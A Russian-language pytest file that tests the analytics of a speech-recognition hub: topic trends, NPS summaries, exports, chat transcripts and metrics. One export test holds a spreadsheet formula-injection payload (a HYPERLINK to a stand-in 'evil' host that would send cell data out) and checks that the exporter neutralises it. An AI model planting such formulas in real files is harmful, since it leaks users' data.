"""Заход 43: аналитика по корпусу — темы, NPS в своде, тренды, выгрузки,
переписка, очередь коучинга, метрики.

Каждая проверка воспроизводит сценарий из сплошной проверки аналитики
содержания: на прежнем коде она падает, на исправленном — проходит.
"""
from __future__ import annotations

import csv
import io
import random
import sqlite3
import time
import zipfile
from pathlib import Path

import pytest
from asrhub.db import Database
from asrhub.insights import Insights, признаки_для

СУТКИ = 86400.0


def _задание(db: Database, job_id: str, когда: float, *, source: str = "api",
             text: str = "текст", tags: str = "") -> str:
    db.create_job({"id": job_id, "filename": f"{job_id}.wav", "media_duration_s": 60.0,
                   "owner": "o", "source": source, "tags": tags})
    db.execute("UPDATE jobs SET created_at=? WHERE id=?", (когда, job_id))
    db.update_job(job_id, status="completed", text=text, finished_at=когда)
    return job_id


def _разбор(db: Database, job_id: str, основы: list[str] | None = None, **поля) -> None:
    свод = {"version": 8, "sentiment": 0.1, "speakers": 2, **поля}
    db.save_content(job_id, свод, [{"stem": о, "word": о, "n": 1} for о in (основы or [])])


# ---------------------------------------------------------------------------
# Темы: «что изменилось» и «новые слова»
# ---------------------------------------------------------------------------

@pytest.fixture()
def две_недели(tmp_path: Path) -> Database:
    """По сорок записей в текущей и прошлой неделе, словарь из ста основ.

    Каждая основа есть в обоих окнах; «мегаакц» — только в трёх свежих,
    «сбо» — только в двадцати прошлых.
    """
    db = Database(tmp_path / "asrhub.db")
    сейчас = time.time()
    словарь = [f"тема{n:03d}" for n in range(100)]
    случай = random.Random(7)
    for неделя in (0, 1):
        for n in range(40):
            job_id = _задание(db, f"w{неделя}n{n:02d}",
                              сейчас - (1 + n % 5) * СУТКИ * 0.9 - неделя * 7 * СУТКИ)
            основы = случай.sample(словарь, 70)
            if неделя == 0 and n < 3:
                основы.append("мегаакц")
            if неделя == 1 and n < 20:
                основы.append("сбо")
            _разбор(db, job_id, основы)
    return db


def _правда(db: Database, since: float, until: float) -> dict[str, int]:
    return {т["stem"]: т["records"]
            for т in db.top_terms(since=since, until=until, limit=100000, min_records=1)}


def test_что_изменилось_не_выдумывает_скачков(две_недели: Database):
    """Прошлое окно спрашивалось перечнем основ с пределом 60: из девяноста
    основ возвращалось шестьдесят, остальные считались «было 0»."""
    insights = Insights(две_недели)
    начало, прошлое = insights.window("week")
    было = _правда(две_недели, прошлое, начало)
    сейчас = _правда(две_недели, начало, time.time() + 1)
    тренд = insights.topic_trend("week")
    assert len(тренд) == 15
    for т in тренд:
        assert т["before"] == было.get(т["stem"], 0), т
        assert т["now"] == сейчас.get(т["stem"], 0), т


def test_угасшая_тема_попадает_в_изменения(две_недели: Database):
    """Тема, которой не стало совсем, в верхушку текущего окна не попадает —
    и раньше её не было в «что изменилось» вовсе."""
    тренд = Insights(две_недели).topic_trend("week")
    угасшая = next((т for т in тренд if т["stem"] == "сбо"), None)
    assert угасшая is not None, тренд
    assert угасшая["now"] == 0 and угасшая["before"] == 20 and угасшая["delta"] < 0


def test_новое_слово_находится_даже_редкое(две_недели: Database):
    """«Мегаакция» в трёх записях стояла 676-й и до фильтра не доживала."""
    новые = Insights(две_недели).new_topics("week")
    assert [т["stem"] for т in новые] == ["мегаакц"], новые
    assert новые[0]["now"] == 3 and новые[0]["before"] == 0


def test_перечень_основ_возвращается_целиком(две_недели: Database):
    основы = [f"тема{n:03d}" for n in range(100)]
    assert len(две_недели.top_terms(stems=основы, min_records=0)) == 100


def test_новых_слов_нет_без_прошлого_окна(tmp_path: Path):
    db = Database(tmp_path / "asrhub.db")
    for n in range(5):
        _разбор(db, _задание(db, f"j{n}", time.time() - 3600), ["новинк"])
    assert Insights(db).new_topics("week") == []


# ---------------------------------------------------------------------------
# NPS в своде: предсказанный и названный — раздельно
# ---------------------------------------------------------------------------

def test_индекс_nps_только_по_предсказанным(tmp_path: Path):
    db = Database(tmp_path / "asrhub.db")
    сейчас = time.time()
    # Четыре предсказанных промоутера, у двух из них клиент назвал 3.
    for n in range(4):
        _разбор(db, _задание(db, f"p{n}", сейчас - 60 * n), nps=9, nps_group="промоутер",
                nps_said=3 if n < 2 else None, nps_stated=1 if n < 2 else 0)
    # Ровный разговор без предсказания и оценка по пятибалльной шкале.
    _разбор(db, _задание(db, "c0", сейчас - 600), csat_said=5)
    свод = Insights(db).summary("week")
    assert свод["nps_checked"] == 4 and свод["nps_index"] == 100
    assert свод["nps_stated_count"] == 2 and свод["nps_stated_avg"] == 3.0
    assert свод["nps_stated_index"] == -100 and свод["detractors_stated"] == 2
    assert свод["csat_count"] == 1 and свод["csat_avg"] == 5.0
    лента = Insights(db).timeline("week")
    точки = [т for т in лента["buckets"] if т["records"]]
    assert sum(т["nps_said_count"] for т in точки) == 2
    assert all(т["nps_said"] in (None, 3.0) for т in точки)
    assert any(т["nps_said"] == 3.0 for т in точки)


def _база_версии_27(путь: Path) -> None:
    """База с данными в прежнем смысле: названный балл лежит в `nps`."""
    db = Database(путь)
    сейчас = time.time()
    _разбор(db, _задание(db, "stated", сейчас), nps=3, nps_group="критик", nps_stated=1)
    _разбор(db, _задание(db, "predicted", сейчас), nps=8, nps_group="нейтрал", nps_stated=0)
    _задание(db, "chat", сейчас, source="text")
    db.update_job("chat", suspect_segments=0, suspect_share=0.0,
                  quality_flags="fragments", quality_detail="{}")
    _задание(db, "call", сейчас)
    db.update_job("call", suspect_segments=2, suspect_share=0.5,
                  quality_flags="phrase", quality_detail="{}")
    db.conn.close()
    with sqlite3.connect(путь) as conn:
        conn.execute("UPDATE content SET nps_said = NULL")
        conn.execute("PRAGMA user_version=27")


def test_переход_на_28_разделяет_названный_и_снимает_качество_с_переписки(tmp_path: Path):
    путь = tmp_path / "asrhub.db"
    _база_версии_27(путь)
    db = Database(путь)
    stated = db.get_content("stated")
    assert stated["nps_said"] == 3 and stated["nps"] is None and stated["nps_group"] is None
    predicted = db.get_content("predicted")
    assert predicted["nps"] == 8 and predicted["nps_said"] is None
    assert db.get_job("chat")["quality_flags"] is None
    assert db.get_job("call")["quality_flags"] == ["phrase"], "звонок трогать нельзя"


# ---------------------------------------------------------------------------
# Средние по меткам — по числу измеренных записей
# ---------------------------------------------------------------------------

def test_средние_по_меткам_взвешиваются_по_измеренным(tmp_path: Path):
    """Сочетание из ста записей, где доля речи измерена у пяти, весило как сто."""
    db = Database(tmp_path / "asrhub.db")
    сейчас = time.time()
    for n in range(100):
        _разбор(db, _задание(db, f"ab{n}", сейчас - n, tags="a,b"),
                talk_share=0.8 if n < 5 else None)
    for n in range(20):
        _разбор(db, _задание(db, f"a{n}", сейчас - n, tags="a"), talk_share=0.5)
    разрез = Insights(db).breakdown("tag", "week")
    по_меткам = {г["key"]: г for г in разрез["items"]}
    # (5 × 0,8 + 20 × 0,5) ÷ 25 = 0,56, а не (100 × 0,8 + 20 × 0,5) ÷ 120.
    assert по_меткам["a"]["talk_share"] == pytest.approx(0.56, abs=0.001)
    assert по_меткам["b"]["talk_share"] == pytest.approx(0.8, abs=0.001)


# ---------------------------------------------------------------------------
# Очередь коучинга — настоящим счётом
# ---------------------------------------------------------------------------

def test_очередь_коучинга_считает_всё_а_не_выдачу(tmp_path: Path):
    db = Database(tmp_path / "asrhub.db")
    сейчас = time.time()
    for n in range(30):
        _разбор(db, _задание(db, f"k{n}", сейчас - n * 60), violations=1, agent_score=40)
    очередь = Insights(db).coaching("week", limit=10)
    assert очередь["total"] == 30 and очередь["shown"] == 10
    assert len(очередь["items"]) == 10
    мало = Insights(db).coaching("week", limit=50)
    assert мало["total"] == 30 == мало["shown"]


# ---------------------------------------------------------------------------
# Выводы и подписи
# ---------------------------------------------------------------------------

def test_вывод_про_часы_с_двумя_знаками(tmp_path: Path):
    insights = Insights(Database(tmp_path / "asrhub.db"))
    свод = Insights._свод({"records": 60, "scored": 60, "sentiment": 0.1734})
    часы = {"items": [{"label": f"{ч:02d}:00", "records": 15, "sentiment": с}
                      for ч, с in ((9, 0.2), (10, 0.25), (11, -0.2123), (12, 0.3))]}
    выводы = insights.findings("week", свод=свод, прошлый={}, разрезы={"hour": часы},
                               категории={}, драйверы={}, нормы={})
    текст = next(в["text"] for в in выводы if в.get("dimension") == "hour")
    assert "-0.21 против 0.17" in текст, текст


def test_порог_тишины_в_подписях_берётся_из_настроек():
    признаки = {п["key"]: п for п in признаки_для({"content_dead_air_s": 5,
                                                   "content_pause_s": 2.5})}
    assert "от 5 с" in признаки["dead_air_s"]["hint"]
    assert "от 2,5 с" in признаки["reply_delay_s"]["hint"]
    # Без настроек — значения по умолчанию, и остальные подписи не тронуты.
    по_умолчанию = {п["key"]: п for п in признаки_для(None)}
    assert "от 3 с" in по_умолчанию["dead_air_s"]["hint"]
    assert по_умолчанию["mood"]["hint"]


def test_выгрузка_содержания_подписывает_настоящий_порог():
    from asrhub.content_export import _таблицы

    отчёт = {"summary": {"records": 3, "dead_air_s": 4.0}, "previous": {},
             "thresholds": {"dead_air_s": 5.0},
             "breakdowns": {"owner": {"items": [{"label": "anna", "records": 3}]}}}
    таблицы = {т[0]: т for т in _таблицы(отчёт)}
    подписи = [строка[0] for строка in таблицы["Свод"][2]]
    assert "Заметная тишина (паузы от 5 с), с" in подписи
    assert not any("от 3 с" in п for п in подписи)
    # И заголовки разрезов — с тем же порогом.
    assert "Заметная тишина (паузы от 5 с), с" in таблицы["По владельцам"][1]


# ---------------------------------------------------------------------------
# Тренды: свод за период по суммам сырья
# ---------------------------------------------------------------------------

def test_свод_трендов_по_суммам_а_не_по_корзинам(tmp_path: Path):
    """День с одним упавшим и день с 99 успешными давали «успешных 50 %»."""
    from asrhub.trends import Trends

    db = Database(tmp_path / "asrhub.db")
    сейчас = time.time()
    db.create_job({"id": "f0", "filename": "f0.wav", "owner": "o"})
    db.execute("UPDATE jobs SET created_at=?, status='failed' WHERE id='f0'",
               (сейчас - 10 * СУТКИ + 100,))
    for k in range(99):
        db.create_job({"id": f"c{k:02d}", "filename": "c.wav", "owner": "o"})
        db.execute("UPDATE jobs SET created_at=?, status='completed' WHERE id=?",
                   (сейчас - 5 * СУТКИ + 100 + k, f"c{k:02d}"))
    свод = Trends(db).series("month", bucket="day", metrics=["success_rate", "jobs"],
                             compare=False, is_admin=True)
    по_id = {с["id"]: с for с in свод["summary"]}
    assert по_id["success_rate"]["avg"] == 99.0
    assert по_id["success_rate"]["total"] is None, "сумма процентов — бессмыслица"
    # Сто заданий за десять суток от первого: десять в сутки, а не пятьдесят.
    assert по_id["jobs"]["avg"] == 10.0 and по_id["jobs"]["total"] == 100.0


def test_пояснения_трендов_описывают_то_что_считается():
    from asrhub.trends import ПО_ID

    assert "суд" in ПО_ID["alert_records"].hint and "конкурент" not in ПО_ID["alert_records"].hint
    assert "вежлив" in ПО_ID["empathy"].hint.lower()
    assert "по имени" not in ПО_ID["empathy"].hint
    assert "сколько можно" in ПО_ID["frustrated"].hint
    assert "тон" not in ПО_ID["frustrated"].hint.split("«")[0]


# ---------------------------------------------------------------------------
# Выгрузки
# ---------------------------------------------------------------------------

def test_дробь_в_csv_через_запятую():
    from asrhub.analytics_export import _собрать_csv

    архив = zipfile.ZipFile(io.BytesIO(_собрать_csv(
        [("лист", ["Имя", "Доля", "Число", "Пусто"], [["a", 12.5, 3, float("nan")],
                                                      ["b", 0.35, -4, 1.0]])], "период")))
    строки = list(csv.reader(io.StringIO(архив.read("лист.csv").decode("utf-8-sig")),
                             delimiter=";"))
    assert строки[1] == ["a", "12,5", "3", ""]
    assert строки[2] == ["b", "0,35", "-4", "1,0"]


def test_в_книге_нет_апострофа_а_формулы_нет_всё_равно():
    openpyxl = pytest.importorskip("openpyxl")
    from asrhub.analytics_export import _собрать_xlsx

    злая = '=HYPERLINK("http://зло.рф/?x="&A1;"отчёт")'
    книга = openpyxl.load_workbook(io.BytesIO(_собрать_xlsx(
        [("лист", ["Файл", "Срок", "Число"], [[злая, "-5 минут", 5]])], "заголовок")))
    лист = книга["лист"]
    assert лист["A2"].value == злая and лист["A2"].data_type == "s"
    assert лист["A2"].quotePrefix
    assert лист["B2"].value == "-5 минут"
    assert лист["C2"].value == 5 and лист["C2"].data_type == "n"


# ---------------------------------------------------------------------------
# Переписка: качество распознавания, оператор при пересчёте, проверка очередью
# ---------------------------------------------------------------------------

ПЕРЕПИСКА = [{"speaker": "клиент", "text": t} if n % 2 == 0 else {"speaker": "Анна", "text": t}
             for n, t in enumerate([
                 "Здравствуйте, где мой заказ?", "Здравствуйте! Компания Ромашка, меня зовут Анна.",
                 "Заказ 4512.", "Секунду, проверяю.", "Жду.", "Курьер привезёт завтра.",
                 "Спасибо.", "Всего доброго!"])]


def test_переписка_не_получает_признаков_подозрительной_расшифровки(client):
    ответ = client.post("/api/jobs/text", json={"channel": "chat", "messages": ПЕРЕПИСКА})
    assert ответ.status_code == 200, ответ.text
    тело = ответ.json()
    assert тело["agent"] == "Анна"
    состояние = client.app.state.hub
    assert состояние.db.get_job(тело["id"])["quality_flags"] is None
    # И прежняя отметка снимается пересчётом.
    состояние.db.update_job(тело["id"], quality_flags="fragments", suspect_segments=0,
                            suspect_share=0.0)
    assert client.post(f"/api/content/jobs/{тело['id']}/recompute").status_code == 200
    assert состояние.db.get_job(тело["id"])["quality_flags"] is None


def test_пересчёт_переписки_помнит_оператора(client):
    """Оператор переписки определялся только при приёме; пересчёт брал
    настройку, и в чате, где первым пишет клиент, скрипт шёл по клиенту."""
    тело = client.post("/api/jobs/text", json={"messages": ПЕРЕПИСКА}).json()
    assert тело["content"]["compliance"]["speaker"] == "Анна"
    состояние = client.app.state.hub
    assert состояние.db.get_job(тело["id"])["params"]["agent"] == "Анна"
    client.post(f"/api/content/jobs/{тело['id']}/recompute")
    разбор = состояние.db.get_content(тело["id"])["detail"]
    assert разбор["compliance"]["speaker"] == "Анна"
    # Разбор архива — тот же оператор.
    состояние.db.execute("UPDATE content SET version=0")
    состояние.content.backfill_once(limit=10)
    assert состояние.db.get_content(тело["id"])["detail"]["compliance"]["speaker"] == "Анна"


def test_проверка_скрипта_в_редакторе_видит_обращение_по_имени(client):
    """Пункт «Обратился по имени» был выполнен в разборе и не выполнен в
    редакторе на той же записи: факты туда не передавались."""
    переписка = [{"speaker": "клиент", "text": "Здравствуйте."},
                 {"speaker": "Анна", "text": "Павел, подскажите номер заказа."}]
    тело = client.post("/api/jobs/text", json={"messages": переписка}).json()
    скрипт = [{"id": "name", "label": "Обратился по имени", "check": "customer_name"}]
    ответ = client.post("/api/content/script/check",
                        json={"job_id": тело["id"], "script": скрипт})
    assert ответ.status_code == 200, ответ.text
    итог = ответ.json()["compliance"]
    assert итог["speaker"] == "Анна"
    assert итог["items"][0]["passed"] is True


def test_проверка_набора_категорий_предупреждает_о_правиле_из_не(client):
    тело = client.post("/api/jobs/text", json={"messages": ПЕРЕПИСКА}).json()
    набор = [{"id": "no_bye", "label": "Не попрощался", "kind": "violation", "who": "agent",
              "rule": 'НЕ "до свидания"'}]
    ответ = client.post("/api/content/categories/check",
                        json={"job_id": тело["id"], "categories": набор}).json()
    assert ответ["agent"] == "Анна"
    assert ответ["notes"] and "Не попрощался" in ответ["notes"][0]
    assert ответ["result"]["items"][0]["count"] == 1


def test_переписка_не_идёт_в_ручную_проверку_распознавания(tmp_path: Path):
    from asrhub.review import sample_review

    db = Database(tmp_path / "asrhub.db")
    сейчас = time.time()
    for n in range(5):
        _задание(db, f"chat{n}", сейчас - 60, source="text")
    _задание(db, "call", сейчас - 60)
    итог = sample_review(db, {"review_daily_share": 100.0, "review_daily_max": 20},
                         now=сейчас, rng=random.Random(1))
    assert итог["candidates"] == 1
    assert db.review_queued_ids() == {"call"}


# ---------------------------------------------------------------------------
# Метрики и ряды
# ---------------------------------------------------------------------------

def test_кавычка_в_имени_категории_не_ломает_метрики(tmp_path: Path):
    from asrhub.analytics import Analytics

    class Свод:
        index = None

        def summary(self, period):
            return {"records": 1}

        def categories(self, period):
            return {"items": [{"id": 'оплата"} 1\nx', "kind": "topic", "records": 1,
                               "share": 50.0}],
                    "trackers": [{"category": 'трек"ер', "hits": 2}]}

    строки: list[str] = []
    Analytics(Database(tmp_path / "asrhub.db"))._prometheus_content(
        Свод(), lambda имя, значение, метки="", *_: строки.append(f"{имя}{{{метки}}} {значение}"))
    доля = next(с for с in строки if с.startswith("content_category_share"))
    assert доля == 'content_category_share{category="оплата\\"} 1\\nx",kind="topic"} 0.5'
    трекер = next(с for с in строки if с.startswith("content_tracker_hits"))
    assert трекер == 'content_tracker_hits{category="трек\\"ер"} 2'


def test_нулевое_ожидание_в_очереди_входит_в_ряд(tmp_path: Path):
    from asrhub.analytics import Analytics

    db = Database(tmp_path / "asrhub.db")
    сейчас = time.time()
    for job_id, ожидание in (("q0", 0.0), ("q1", 10.0)):
        db.create_job({"id": job_id, "filename": "a.wav", "owner": "o"})
        db.execute("UPDATE jobs SET created_at=?, status='completed', queue_time_s=? "
                   "WHERE id=?", (сейчас - 60, ожидание, job_id))
    ряд = Analytics(db).timeseries("day", buckets=4)
    значения = [v for v in ряд["queue_time"] if v is not None]
    assert значения == [5.0], ряд["queue_time"]
